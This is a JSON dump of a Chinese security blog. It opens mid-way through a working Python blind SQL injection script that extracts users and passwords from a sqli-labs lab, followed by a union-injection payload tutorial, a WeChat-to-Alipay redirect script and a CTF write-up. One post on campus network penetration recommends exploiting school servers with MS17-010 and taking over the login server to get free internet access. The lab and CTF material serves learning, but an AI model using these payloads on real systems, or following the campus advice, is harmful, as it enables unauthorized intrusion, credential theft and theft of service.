information_schema.tables where table_schema='%s')&gt;%d -- + \" %(database,table_number) if success not in requests.get(url).content: print \"tablesnumber :\" + str(table_number) break#获取表名for o in range(0,table_number): for t in range(1,20): url=\"http://localhost/sqli-labs-master/Less-8/?id=1'and (select length(table_name) from information_schema.tables where table_schema='%s' limit %d,1)=%d -- +\" %(database,o,t) if success in requests.get(url).content: print \"lenth is:\" + str(t) for tablelenth in range(1,t+1): for table_number in range(33,126): url=\"http://localhost/sqli-labs-master/Less-8/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))&gt;%d -- +\" %(database,o,tablelenth,table_number) if success not in requests.get(url).content: tablename += chr(table_number) break print \"tablename is :\" + tablename tablename = \"\"#获取users列名数量for p in range(1,20): url = \"http://localhost/sqli-labs-master/Less-8/?id=1'and (select count(column_name) from information_schema.columns where table_schema='security' and table_name = 'users')&gt;%d -- + \" %(p) if success not in requests.get(url).content: print \"column_number:\" + str(p) break#获取users表列名for column_number in range(0,p): for column_lenth in range(1,20): url =\"http://localhost/sqli-labs-master/Less-8/?id=1' and (select length(column_name) from information_schema.columns where table_schema='security' and table_name = 'users' limit %d,1)=%d -- + \" %(column_number,column_lenth) if success in requests.get(url).content: print \"column lenth：\" + str(column_lenth) for m in range(1,column_lenth+1): for l in range(33,126): url = \"http://localhost/sqli-labs-master/Less-8/?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit %d,1),%d,1))=%d -- +\" %(column_number,m,l) if success in requests.get(url).content: columns += chr(l) break print \"column_name is:\" + columns columns = \"\"#获取users表列数for data_number in range(1,20): url =\"http://localhost/sqli-labs-master/Less-8/?id=1'and (select count(*) from users)=%d -- +\" %(data_number) if success in requests.get(url).content: print \"data_number :\" + str(data_number) breakfor data in range(0,data_number): #获取username字符串长度 for datalenth in range(1,50): url =\"http://localhost/sqli-labs-master/Less-8/?id=1'and (select length(username) from users limit %d,1)=%d --+\" %(data,datalenth) if success in requests.get(url).content: break #获取username字符串内容 for d in range(1,data_number+1): for user in range(33,126): url =\"http://localhost/sqli-labs-master/Less-8/?id=1'and ascii(substr((select username from users limit %d,1),%d,1))=%d --+\" %(data,d,user) if success in requests.get(url).content: username += chr(user) break #获取password字符串长度 for datalenth in range(1,50): url =\"http://localhost/sqli-labs-master/Less-8/?id=1'and (select length(password) from users limit %d,1)=%d --+\" %(data,datalenth) if success in requests.get(url).content: break #获取password字符串内容 for d in range(1,data_number+1): for passwd in range(33,126): url =\"http://localhost/sqli-labs-master/Less-8/?id=1'and ascii(substr((select password from users limit %d,1),%d,1))=%d --+\" %(data,d,passwd) if success in requests.get(url).content: password += chr(passwd) break print \"user : \" + username + \" password: \" + password username = \"\" password = \"\" 效果图","tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"SQL injection（联合查询）","date":"2018-01-06T19:34:43.000Z","path":"2018/01/07/sql-injection-一/","text":"前天发那个微信js跳转支付宝的一夜就黄了！寻思想写点啥东西？想了很久都没想到。最后决定还是记录下sql注入的基础，还有怎么针对sql注入漏洞来编写python脚本吧 sql注入的分类1.UNION query SQL injection（联合查询注入）2.Error-based SQL injection（报错型注入）3.Boolean-based blind SQL injection（布尔型注入）4.Time-based blind SQL injection（基于时间延迟注入）5.Stacked queries SQL injection（多语句查询注入） Union query SQL injection联合查询在sql注入里面是最快获取数据的方法通过UNION来执行注入的sql语句，前提是请求返回后能输出SQL执行后查询到的所有内容 步骤：1.检测字段数2.获取数据库基本信息3.获取数据库所有的表4.获取表的字段5.获取表的内容 知识扫盲user() 用户函数database() 数据库函数version() 版本号函数information_schemamysql自带的库，这个库保存了mysql服务器所有的信息information_schema.schemata 含有所有数据库名的表information_schema.tables 含有所有表名的表information_schema.columns 含有所有列的表concat_ws()函数,字符串处理函数char()函数字符串函数concat_ws()主要是处理char()函数，CHAR(32,58,32)解析出来就是空格:空格 检测字段数格式：’ order by (number)’ order by 1 – + 网页显示正常’ order by 2 – + 网页显示正常’ order by 3 – + 网页显示正常’ order by 4 – + 网页显示错误则字段数为4检测字段数还有另一种方法格式： ‘ union select 1,2,3,4,5……依次从1开始检测，判定结果和order by一样还有一个问题我们为什么要在语句后面加上-- +呢？应该-- +在sql语句里表示结束的意思除了-- +我们还可以使用#号，很多时候运维人员会限制掉#号，这时候我们可以用%23代替检测字段后接下来我们来构建查询语句 查询数据库基本信息1http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,concat_ws(char(32,58,32),database(),user(),version()),3 -- + 查询表信息1http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() -- + 这里只显示了一个表怎么肥事咧？猜测应该是用了limit语句我们可以在语句后面加上limit语句依次将所有的表列出来不过这样太麻烦了，我们这时候用到group_concat()函数，让它们一次全导出来 1http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(char(32),table_name,char(32)),3 from information_schema.tables where table_schema=database() -- + 查询列信息1http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(char(32),column_name,char(32)),3 from information_schema.columns where table_name=0x7573657273 -- + 注意，查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了，这对过滤单引号应该有指导意义。users的十六进制转换是：0x7573657273 查询表的内容1http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users -- + 这篇联合查询的文章就不写脚本了，等下一篇sql盲注再写忘了介绍这款sql注入练习源码，百度sqli-labs","tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"}]},{"title":"js微信跳转支付宝","date":"2018-01-05T11:20:31.000Z","path":"2018/01/05/js微信跳转支付宝/","text":"今天早上朋友圈看到这样一条信息-苍井空大战波多野结衣--http://t.cn/RHmcyqY-喔擦咧-首先YY了下-还是没忍住点进去了打开后-直接跳转支付宝领了红包怎么肥事 扫支付宝二维码先拿到这个网址：1https://qr.alipay.com/c1x02451lejif5k7nmbel74 js跳转微信一般情况下是打不开支付宝，让微信先打开普通的网站，然后在网站上加上一段调用其他浏览器的js，其他浏览器直接跳转支付宝，完美让别人一点进去就领取你的红包 经过bp抓包拿到了js跳转的源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;html lang=\"zh-cmn-hans\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;&lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge, chrome=1\"&gt;&lt;title&gt;正在打开支付宝，请稍候……&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;&lt;script&gt; var _0 = \"https://qr.alipay.com/c1x02451lejif5k7nmbel74\"; #这里填支付宝二维码拿到那个地址var _1 = \"https://qr.alipay.com/c1x02451lejif5k7nmbel74\"; #这里填支付宝二维码拿到那个地址function is_weixin() &#123; if (/MicroMessenger/i.test(navigator.userAgent)) &#123; return true &#125; else &#123; return false &#125;&#125;function is_android() &#123; var ua = navigator.userAgent.toLowerCase(); if (ua.match(/(Android|SymbianOS)/i)) &#123; return true &#125; else &#123; return false &#125;&#125;function is_ios() &#123; var ua = navigator.userAgent.toLowerCase(); if (/iphone|ipad|ipod/.test(ua)) &#123; return true &#125; else &#123; return false &#125;&#125;function android_auto_jump() &#123; WeixinJSBridge.invoke(\"jumpToInstallUrl\", &#123;&#125;, function(e) &#123;&#125;); window.close(); WeixinJSBridge.call(\"closeWindow\")&#125;function ios_auto_jump() &#123; if (_0 != \"\") &#123; location.href = _0 &#125; else &#123; window.close(); WeixinJSBridge.call(\"closeWindow\") &#125;&#125;function onAutoinit() &#123; if (is_android()) &#123; android_auto_jump(); return false &#125; if (is_ios()) &#123; ios_auto_jump(); return false &#125;&#125;if (is_weixin()) &#123; if (typeof WeixinJSBridge == \"undefined\") &#123; if (document.addEventListener) &#123; document.addEventListener(\"WeixinJSBridgeReady\", onAutoinit, false) &#125; else if (document.attachEvent) &#123; document.attachEvent(\"WeixinJSBridgeReady\", onAutoinit); document.attachEvent(\"onWeixinJSBridgeReady\", onAutoinit) &#125; &#125; else &#123; onAutoinit() &#125;&#125; else &#123; if (_1 != \"\") &#123; location.href = _1 &#125; else &#123; window.close() &#125;&#125;&lt;/script&gt; 有没有一种一夜暴富的感觉!哈哈哈 你以为到这里就结束了？从安全角度分析，虽然这是一场流量大V的发红包狂欢，但不得不防有犯罪分子乘机构造各种恶意链接混在其中去获取的个人信息！可能你点击的前一万个链接都是跳转支付宝的链接，你慢慢的就放松了警惕，忘记了爸爸妈妈所说的，新闻中报到的各种不明的链接不能乱点的警示案例~以上利用方式其实就是大家所熟知的 CSRF，下面就简单介绍一下 CSRF 攻击。 CSRF 攻击介绍CSRF（Cross-site request forgery），它的中文名称是跨站请求伪造 也被称为：one click attack/session riding 缩写为：CSRF/XSRF 简单地说，CSRF 就是利用了我们的登录状态或者授权状态，然后做一些损害我们自身利益的事情。","tags":[{"name":"JS跳转","slug":"JS跳转","permalink":"http://yoursite.com/tags/JS跳转/"}]},{"title":"kali实现的进程实时显示","date":"2018-01-03T14:57:33.000Z","path":"2018/01/03/kali实现的进程实时显示/","text":"刚开始玩kali的时候一直感觉桌面太单调了，监视系统运行信息，然后就找到了conky感觉还不错 安装1# apt-get install conky-all 安装主题的目录1# /etc/conky/conky.conf 使用1直接在终端输入 conky 就可以运行 默认情况下 自己修改后的一段代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117-- vim: ts=4 sw=4 noet ai cindent syntax=lua--[[Conky, a system monitor, based on torsmoAny original torsmo code is licensed under the BSD licenseAll code written since the fork of torsmo is licensed under the GPLPlease see COPYING for detailsCopyright (c) 2004, Hannu Saransaari and Lauri HakkarainenCopyright (c) 2005-2012 Brenden Matthews, Philip Kovacs, et. al. (see AUTHORS)All rights reserved.This program is free software: you can redistribute it and/or modifyit under the terms of the GNU General Public License as published bythe Free Software Foundation, either version 3 of the License, or(at your option) any later version.This program is distributed in the hope that it will be useful,but WITHOUT ANY WARRANTY; without even the implied warranty ofMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See theGNU General Public License for more details.You should have received a copy of the GNU General Public Licensealong with this program. If not, see &lt;http://www.gnu.org/licenses/&gt;.]]conky.config = &#123;background = true,update_interval=1,double_buffer=true,imlib_cache_size=10,draw_shades=false,draw_outline=false,draw_borders = false,draw_graph_borders = false,show_graph_scale = false,show_graph_range = false,minimum_height = 620,minimum_width = 268,own_window = true,own_window_class = 'Conky',own_window_type = 'normal',own_window_transparent=true,border_inner_margin=0,border_outer_margin=0,own_window_hints=\"undecorated,below,sticky,skip_taskbar,skip_pager\",own_window_argb_visual=true,own_window_argb_value=0,use_xft = true,xftalpha=0.8,font = 'DejaVu Sans Mono:size=12',text_buffer_size=256,short_units=true,short_units=true,pad_percents=2,top_name_width=7, alignment = 'top_right', border_width = 1, cpu_avg_samples = 2, default_color = 'white', gap_x = 5, gap_y = 60, net_avg_samples = 2, no_buffers = true, out_to_console = false, out_to_stderr = false, extra_newline = false, stippled_borders = 0, update_interval = 1.0, uppercase = false, use_spacer = 'none',&#125;conky.text = [[$nodename - $sysname $kernel on $machine$hr$&#123;color #98c2c7&#125;homename: $&#123;color&#125;$alignr$nodename$&#123;color #98c2c7&#125;kernel: $&#123;color&#125;$alignr$kernel$&#123;color #98c2c7&#125;uptime: $&#123;color&#125;$alignr$uptime$&#123;color #98c2c7&#125;CPU Usage: $&#123;color&#125;$cpu%$cpubar CPU1 $alignr$&#123;exec sensors | grep 'Core 0' | cut -c17-25&#125; CPU2 $alignr$&#123;exec sensors | grep 'Core 1' | cut -c17-25&#125;$&#123;color #98c2c7&#125;CPU Usage:$&#123;color&#125; $&#123;top name 1&#125; $&#123;alignr&#125;$&#123;top cpu 1&#125; $&#123;top name 2&#125; $&#123;alignr&#125;$&#123;top cpu 2&#125; $&#123;top name 3&#125; $&#123;alignr&#125;$&#123;top cpu 3&#125; $&#123;top name 4&#125; $&#123;alignr&#125;$&#123;top cpu 4&#125; $&#123;top name 5&#125; $&#123;alignr&#125;$&#123;top cpu 5&#125; $&#123;top name 6&#125; $&#123;alignr&#125;$&#123;top cpu 6&#125; $&#123;top name 7&#125; $&#123;alignr&#125;$&#123;top cpu 7&#125; $&#123;top name 8&#125; $&#123;alignr&#125;$&#123;top cpu 8&#125; $&#123;color #98c2c7&#125;RAM Usage: $&#123;color&#125;$&#123;alignr&#125;$mem / $memmax$&#123;membar&#125;$&#123;color #98c2c7&#125;ROOT: $&#123;color&#125;$&#123;alignr&#125;$&#123;fs_free /&#125; / $&#123;fs_size /&#125;$&#123;fs_bar 4 /&#125;$&#123;color #98c2c7&#125;Networking:$&#123;color&#125;Up:$alignr$&#123;downspeed enp4s0f2&#125; k/sDown:$alignr$&#123;upspeed enp4s0f2&#125; k/s$&#123;downspeedgraph enp4s0f2 324D23 77B753&#125;]] 将这段代码复制到主题目录文件/etc/conky/conky.conf重新运行conky既可","tags":[{"name":"kai","slug":"kai","permalink":"http://yoursite.com/tags/kai/"},{"name":"系统美化","slug":"系统美化","permalink":"http://yoursite.com/tags/系统美化/"}]},{"title":"校园网渗透测试(系统层篇)","date":"2018-01-02T11:13:49.000Z","path":"2018/01/02/校园网渗透测试-系统层篇/","text":"学校的生活就要过去，下个学期就要去公司实习了。在学校一个人做了半年的渗透测试，写了N篇报告，该看的，不该看的都看过了。 校园网为什么存在众多漏洞？服务器多但是缺少信安人员的管理；服务器的数量和服务器管理能力不成正比校园网都有哪些系统？举些栗子： OA系统 监控系统 财务系统 档案系统 一卡通系统 DNS系统 路由管理系统 上网系统 等等这些系统都是在哪些网段呢？ 0x01对校园网的子网划分进行一个信息收集和猜测局域网保留地址：A类：10.0.0.0/8 10.0.0.0-10.255.255.255B类：172.16.0.0/12 172.16.0.0-172.31.255.255C类：192.168.0.0/16 192.168.0.0～192.168.255.255为什么要先对内网的结构进行收集和猜测呢？主要是为了弄清楚哪些网段有比较多的服务器，还有他们在跑什么业务，这样我们就可以更有针对性的开展渗透测试我们收集这些信息的方法有很多种：1.大范围的扫描80，8080端口2.内网ping学校网站域名（如果设置了外网DNS是无法解析到内网服务器ip的）3.查看路由跳转经过的网段还有很多种这就不一一举例出来了经过一段时间的收集后我们确定出重要的网段然后整理出来 0x02系统层的漏洞扫描使用漏扫工具对这些网段进行漏洞扫描推荐几款漏扫工具：openvas nessus nmap sparte注意一些直接getshell的端口：111 139 445 1099 2049 3632 3389 6667 8787 8180 6379系统层的漏洞利用学习推荐Metasploitable2对于上一年五月份来说一个msf就够，给他来一波ms17-010(永恒之蓝)，一堆shell 0x03问题来了，校园网内不能开nat，不能桥接，找到漏洞利用了，shell怎么返回到虚拟机1.使用bat脚本，持续开启nat服务，然后在虚拟机做个端口映射，映射到物理机上的其他端口，payload设置返回端口为物理机上的端口123456@echo off:sping -n 1 127.1&gt;nullnet start|findstr /i /c:&quot;VMware NAT Service&quot;&gt;nul&amp;&amp;set k=1||set k=0if %k%==0 (net start &quot;VMware NAT Service&quot;) goto s 2.使用windows大杀器PentestBox(聚成kali的很多软件) 0x04校园网拿到shell以后我们可以做什么？？在学校上网被运营商垄断网费贼贵拿到shell可以挂个vpn我们上网就不用交费啦！还有一个就是校园网晚上会断网（当代大学生烦恼的问题）我们只需要拿到上网验证服务器的shell，上去改下我们上网的权限就可以24小时不断网怎么找到上网验证服务器的IP地址呢？验证的时候看跳转/抓包–嘿嘿嘿不说了不说了","tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/内网渗透/"},{"name":"渗透思路","slug":"渗透思路","permalink":"http://yoursite.com/tags/渗透思路/"}]},{"title":"2017-BDCTF","date":"2018-01-02T08:40:26.000Z","path":"2018/01/02/2017-BDCTF/","text":"蓝盾杯高校杯已经过去一个多月，首发当时发到csdn上，那时候没有搭自己的博客！！哎！！ God’s teammates：seeper ，bigboycrypto-114C4A575851324332474E3247535953494B5A574655525A5A4F564D544755544E4C415945534D4444474A4C474D594B554A5A54464D32534F504653564D4F42564D495A44533233474B453654323D3D3D 一眼扫过去根据特性可以判断出是base16解出一个base32进行下一步解密得到一个base64 继续解密 crypto-21ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //´∇｀/ [‘‘]; o=(ﾟｰﾟ) ==3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^^o)/ (o^^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: ‘’ ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +’‘) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ ‘‘)[o^^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +’‘)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +’‘) [c^^o];(ﾟДﾟ) [‘c’] = ((ﾟДﾟ)+’‘) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [‘o’] = ((ﾟДﾟ)+’‘) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [‘c’]+(ﾟДﾟ) [‘o’]+(ﾟωﾟﾉ +’‘)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +’‘) [ﾟｰﾟ] + ((ﾟДﾟ) +’‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +’‘) [ﾟΘﾟ]+((ﾟｰﾟ==3) +’‘) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [‘c’]+((ﾟДﾟ)+’‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [‘o’]+((ﾟｰﾟ==3) +’‘) [ﾟΘﾟ];(ﾟДﾟ) [‘‘] =(o^^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +’‘) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+’‘) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +’‘) [o^^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +’‘) [ﾟΘﾟ]+ (ﾟωﾟﾉ +’‘) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=’\\’; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +’‘)[c^^o];(ﾟДﾟ) [ﾟoﾟ]=’\\”’;(ﾟДﾟ) [‘‘] ( (ﾟДﾟ) [‘‘] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^^o) +(o^^o))+ ((o^^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^^o) +(o^^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^^o) +(o^^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^^o))+ (o^^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^^o) +(o^^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^^o)+ ((ﾟｰﾟ) + (o^^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^^o) +(o^^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^^o) +(o^^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^^o)+ ((ﾟｰﾟ) + (o^^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^^o) +(o^^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^^o) +(o^^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^^o) +(o^^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (‘_’); AAencode！！！直接上浏览器 crypto-3 crypto-4培根密码 crypto-5base64→莫斯密码→acsii→栏珊密码→凯撒密码→反向密码flag{h3r3_y0u_are_bdctf} crypto-61MDExMDAxMTAwMTEwMTEwMDAxMTAwMDAxMDExMDAxMTEwMTExMTAxMTAwMTEwMDEwMDAxMTAxMTEwMTExMDEwMDAxMTAxMDAwMDEwMTExMTEwMTEwMDAxMDAxMTAxMTAwMDExMTAxMDEwMTEwMDEwMTAxMTAwMTAwMDExMDExMTEwMTEwMTExMDAxMDExMTExMDExMDAwMTEwMTExMDEwMTAxMTEwMDAwMDExMTExMDE= base64解码得101100110011011000110000101100111011110110011001000110111011101000110100001011111011000100110110001110101011001010110010001101111011011100101111101100011011101010111000001111101 2进制转16进制1666C61677B323774685F626C7565646F6E5F6375707D 16进制转字符串 flag{27th_bluedon_cup} crypto-7题目 rsa解密取p=29，q=31，公钥e=11，则私钥d=611。若密文的值是666，明文是多少flag{**}得到flag{666} 隐写题-1解题文件解压到本地之后，有一个flag.pcapng的文件。我们可以用wireshark打开发现有flag.rar 然后尝试把数据包后缀改成rar尝试解压后，发现需要密码，用上面包分析哪里得到的cookie的值尝试密码后，是错的拿过去rar用字典爆破出密码是123456解压后得到flag值 隐写题-2解压下载的解题文件，发现是一个蓝盾的图片同样放进kail里面解析出隐藏了一个rar文件修改后缀名为.rar发现需要解压密码用winhex查看一下图片发现了一个key：88882017尝试一下是否是解压密码，结果真的是解压密码 隐写题-3解压后发现一个图片，一看就是一个flag{XXXXX}但是还缺少了什么,我们用图片三原色工具解析到flag 隐写题-4解压出解题文件后发现是一个《我们不一样》的音频拿去kail分析结果没有隐藏什么文件，听一下这首音乐，发现中间有一段音频是断断续续的，思考有可能是摩斯电码用audacity打开后发现有左耳道有一段跟右耳道的音频并不相同放大后发现，有长短间隔，进一步确认是摩斯电码然后用0跟1跟空格的方式 记录下来11 111 010 000 0 1010 111 100 0 1000 0100 001 0 100 111 10 00011 1010 1 0010用0代替点1代替长空格为间隔，摩斯电码解码出morsecodebluedon3ctf 逆向-1放到ollydbg搜索ascll,然后开始一个个看就找到flag 逆向-2这题同样用上面的方法,用OD打开,然后看这边的选项 社工题题目：张三，祖籍广东佛山（063000），1996年9月22日出生，宿舍电话0315-82345678。有一压缩文件（se_flag.rar）忘记密码了，请帮忙找回。Flag就在文件里。 利用社工密码工具生成社工密码在利用rar爆破工具暴力破解密码为0922foshan","tags":[{"name":"蓝盾CTF","slug":"蓝盾CTF","permalink":"http://yoursite.com/tags/蓝盾CTF/"},{"name":"高校杯","slug":"高校杯","permalink":"http://yoursite.com/tags/高校杯/"},{"name":"CTF解题","slug":"CTF解题","permalink":"http://yoursite.com/tags/CTF解题/"}]},{"title":"Welcome to looted’s blog","date":"2018-01-01T09:16:49.700Z","path":"2018/01/01/hello-world/","text":"2018年1月1日,跨完年回到宿舍同学发来信息,说他买了台服务器和域名准备搞个博客我！！！这条信息对我弱小心里造成了10000点物理伤害这段时间有点像条咸鱼,变懒了许多,博客本来一年前就打算搞的了但是笔记都整理到onenote上,自己又懒得去搭博客环境,所以一直没有动今天被打击了一下,马上把搭起来了,也算是2018年给自己一个新的开始吧！","tags":[]}]